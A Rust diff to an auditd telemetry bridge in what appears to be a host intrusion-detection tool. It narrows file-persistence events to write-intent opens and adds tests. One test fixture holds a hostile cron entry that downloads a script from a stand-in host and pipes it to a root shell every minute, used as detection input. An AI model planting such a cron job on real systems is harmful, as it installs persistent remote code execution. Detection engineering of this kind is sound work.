@@ -59,7 +59,10 @@ impl AuditdBridge {
 
         let payload = if is_auth_record(&record_type) {
             Some(self.map_authentication(record, host_id.as_deref())?)
-        } else if syscall.as_deref() == Some("execve") || record_type.eq_ignore_ascii_case("EXECVE")
+        } else if syscall
+            .as_deref()
+            .is_some_and(|value| matches!(value, "execve" | "execveat"))
+            || record_type.eq_ignore_ascii_case("EXECVE")
         {
             Some(self.map_process_start(record)?)
         } else if syscall
@@ -67,11 +70,16 @@ impl AuditdBridge {
             .is_some_and(|value| matches!(value, "connect" | "sendto"))
         {
             Some(self.map_network_connect(record)?)
-        } else if let Some(syscall_name) = syscall
-            .as_deref()
-            .filter(|value| matches!(*value, "open" | "openat" | "creat" | "rename" | "renameat"))
-        {
-            Some(self.map_file_persistence(record, syscall_name)?)
+        } else if let Some(syscall_name) = syscall.as_deref().filter(|value| {
+            matches!(
+                *value,
+                "open" | "openat" | "creat" | "rename" | "renameat" | "renameat2"
+            )
+        }) {
+            let Some(payload) = self.map_file_persistence(record, syscall_name)? else {
+                return Ok(None);
+            };
+            Some(payload)
         } else {
             None
         };
@@ -220,7 +228,23 @@ impl AuditdBridge {
         &mut self,
         record: &Value,
         syscall: &str,
-    ) -> TelemetryBridgeResult<TelemetryPayload> {
+    ) -> TelemetryBridgeResult<Option<TelemetryPayload>> {
+        let operation = match syscall {
+            "rename" | "renameat" | "renameat2" => "rename",
+            "creat" => "create",
+            "open" | "openat" => {
+                // open(2) flags double as rwx mode bits — only emit a file-persistence
+                // event when the open is for write/create/truncate. Read-only opens
+                // (`O_RDONLY`, no creation flags) under watched directories are normal
+                // file reads and would otherwise turn into spurious persistence findings.
+                if open_is_write(record) {
+                    "write"
+                } else {
+                    return Ok(None);
+                }
+            }
+            _ => "write",
+        };
         let exe = required_string(
             record,
             &["/exe", "/comm"],
@@ -229,26 +253,23 @@ impl AuditdBridge {
             SOURCE_ID,
         )?;
 
-        Ok(TelemetryPayload::FilePersistence(FilePersistenceEvent {
-            file_path: required_string(
-                record,
-                &["/path", "/file/path", "/name"],
-                "path",
-                &mut self.health,
-                SOURCE_ID,
-            )?,
-            operation: match syscall {
-                "rename" | "renameat" => "rename",
-                "creat" => "create",
-                _ => "write",
-            }
-            .to_string(),
-            process_name: process_name_from_path(&exe),
-            content_preview: sanitize_optional_string(first_string(
-                record,
-                &["/content_preview", "/data", "/cmdline"],
-            )),
-        }))
+        Ok(Some(TelemetryPayload::FilePersistence(
+            FilePersistenceEvent {
+                file_path: required_string(
+                    record,
+                    &["/path", "/file/path", "/name"],
+                    "path",
+                    &mut self.health,
+                    SOURCE_ID,
+                )?,
+                operation: operation.to_string(),
+                process_name: process_name_from_path(&exe),
+                content_preview: sanitize_optional_string(first_string(
+                    record,
+                    &["/content_preview", "/data", "/cmdline"],
+                )),
+            },
+        )))
     }
 }
 
@@ -275,6 +296,51 @@ impl TelemetryBridge for AuditdBridge {
     fn health(&self) -> BridgeHealth {
         self.health.clone()
     }
+}
+
+/// Test whether an auditd `open`/`openat` record carries write/create/truncate
+/// intent. auditd surfaces `flags` either as a hex/decimal integer (the kernel
+/// open flags) or as a symbolic string like `O_WRONLY|O_CREAT|O_TRUNC`. Without
+/// either signal, fail closed and treat the call as read-only.
+fn open_is_write(record: &Value) -> bool {
+    // Linux `<fcntl.h>` constants. Lower two bits encode access mode.
+    const O_RDONLY: u64 = 0;
+    const O_WRONLY: u64 = 1;
+    const O_RDWR: u64 = 2;
+    const O_ACCMODE: u64 = 3;
+    const O_CREAT: u64 = 0o100;
+    const O_TRUNC: u64 = 0o1000;
+    const O_APPEND: u64 = 0o2000;
+
+    let Some(raw) = first_string(record, &["/flags", "/a1", "/a2"]) else {
+        return false;
+    };
+    let trimmed = raw.trim();
+    if trimmed.is_empty() {
+        return false;
+    }
+    if let Some(numeric) = parse_open_flags(trimmed) {
+        let access = numeric & O_ACCMODE;
+        return access == O_WRONLY
+            || access == O_RDWR
+            || (access == O_RDONLY && (numeric & (O_CREAT | O_TRUNC | O_APPEND)) != 0);
+    }
+    let upper = trimmed.to_ascii_uppercase();
+    upper.contains("O_WRONLY")
+        || upper.contains("O_RDWR")
+        || upper.contains("O_CREAT")
+        || upper.contains("O_TRUNC")
+        || upper.contains("O_APPEND")
+}
+
+fn parse_open_flags(raw: &str) -> Option<u64> {
+    if let Some(stripped) = raw.strip_prefix("0x").or_else(|| raw.strip_prefix("0X")) {
+        return u64::from_str_radix(stripped, 16).ok();
+    }
+    if raw.starts_with('0') && raw.len() > 1 && raw.bytes().all(|b| b.is_ascii_digit()) {
+        return u64::from_str_radix(raw, 8).ok();
+    }
+    raw.parse::<u64>().ok()
 }
 
 /// Resolve `/syscall` to a syscall name when auditd emits a numeric identifier.
@@ -458,6 +524,7 @@ mod tests {
                 "exe": "/bin/bash",
                 "comm": "bash",
                 "path": "/etc/cron.d/evil",
+                "flags": "O_WRONLY|O_CREAT|O_TRUNC",
                 "content_preview": "* * * * * root /usr/bin/curl https://example.invalid/a.sh | sh"
             }),
         ]));
@@ -490,6 +557,50 @@ mod tests {
                 assert_eq!(file.process_name, "bash");
                 assert!(file.content_preview.unwrap().contains("curl"));
             }
+            _ => panic!("expected file_persistence payload"),
+        }
+    }
+
+    #[tokio::test]
+    async fn read_only_openat_does_not_emit_file_persistence() {
+        let mut bridge = AuditdBridge::new(JsonRecordSource::new([json!({
+            "type": "SYSCALL",
+            "serial": 502,
+            "timestamp": "2026-04-13T15:23:00Z",
+            "host": "linux-a",
+            "syscall": "openat",
+            "exe": "/bin/cat",
+            "comm": "cat",
+            "path": "/etc/cron.d/some-watched-job",
+            "flags": "O_RDONLY"
+        })]));
+        let events = bridge.poll().await.expect("poll should succeed");
+        assert!(
+            events.is_empty(),
+            "read-only openat under a watched path must not become file_persistence"
+        );
+
+        // Numeric write flag (O_WRONLY | O_CREAT | O_TRUNC = 0o1101 = 577) should
+        // still emit a write event.
+        let mut bridge = AuditdBridge::new(JsonRecordSource::new([json!({
+            "type": "SYSCALL",
+            "serial": 503,
+            "timestamp": "2026-04-13T15:23:01Z",
+            "host": "linux-a",
+            "syscall": "openat",
+            "exe": "/bin/bash",
+            "comm": "bash",
+            "path": "/etc/cron.d/added",
+            "flags": "577"
+        })]));
+        let event = bridge
+            .poll()
+            .await
+            .expect("write open should map")
+            .pop()
+            .expect("one event");
+        match event.payload {
+            TelemetryPayload::FilePersistence(file) => assert_eq!(file.operation, "write"),
             _ => panic!("expected file_persistence payload"),
         }
     }
